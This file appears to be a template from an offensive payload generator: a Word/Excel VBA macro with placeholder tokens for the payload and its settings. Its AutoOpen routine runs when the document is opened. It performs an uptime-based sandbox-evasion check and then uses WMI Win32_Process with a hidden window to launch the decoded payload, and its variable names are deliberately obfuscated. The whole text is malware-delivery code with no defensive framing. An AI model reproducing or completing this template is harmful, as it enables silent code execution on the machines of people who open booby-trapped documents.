[use:payload_wrapper]
[use:exec]
[use:init_wmi]
[use:init_properties]
Sub AutoOpen()
	Dim var1 As String
	Dim var2 As Object
	Dim var3 As Integer
	Dim var4 As String
	Dim var5 As String
	Dim var6 As Long
	
	var3 = [int1]
	var6 = CLng(decode("[UPTIME]"))
	var1 = func_evasion_uptime(var6)
	If (var1 = "bool1") Then 
		var5 = init_wmi("data1")
		Set var2 = GetObject(var5)
		var4 = payload_wrapper("data1")
		var4 = exec(var2, var4, var3)
	End If
End Sub

Function payload_wrapper(payload_wrapper1 As String) As String
	Dim payload_wrapper2 As String
	[payload]
	payload_wrapper2 = [payload_args]
	payload_wrapper2 = decode(payload_wrapper2)
	payload_wrapper = payload_wrapper2
End Function

Function init_properties() As String
        Dim init_properties1 As String
        init_properties1 = decode("{[winmgmts:root/cimv2]}")
        init_properties = init_properties1
End Function

Function exec(exec1 As Object, exec2 As String, exec3 As Integer) As String
        Dim exec4 As String
        Dim exec5 As Integer
        Dim exec13 As Integer
        Dim exec14 As Integer
        exec5 = [smallint1]
        exec4 = exec2
    If (exec3 > exec5) Then
                Set exec10 = GetObject(init_properties())
                Set exec11 = exec10.Get(decode("{[Win32_ProcessStartup]}"))
                Set exec12 = exec11.SpawnInstance_
                exec5 = exec3 - exec3
                exec5 = exec5 + 12
                exec12.ShowWindow = exec5
                exec14 = exec1.Create(exec4, null, exec12, exec13)
        End If
        exec4 = "exec6"
        exec = exec4
End Function

Function init_wmi(init_wmi1 As String) As String
	Dim init_wmi2 As String
	init_wmi2 = decode("{[winmgmts:Win32_Process]}")
    init_wmi = init_wmi2
End Function
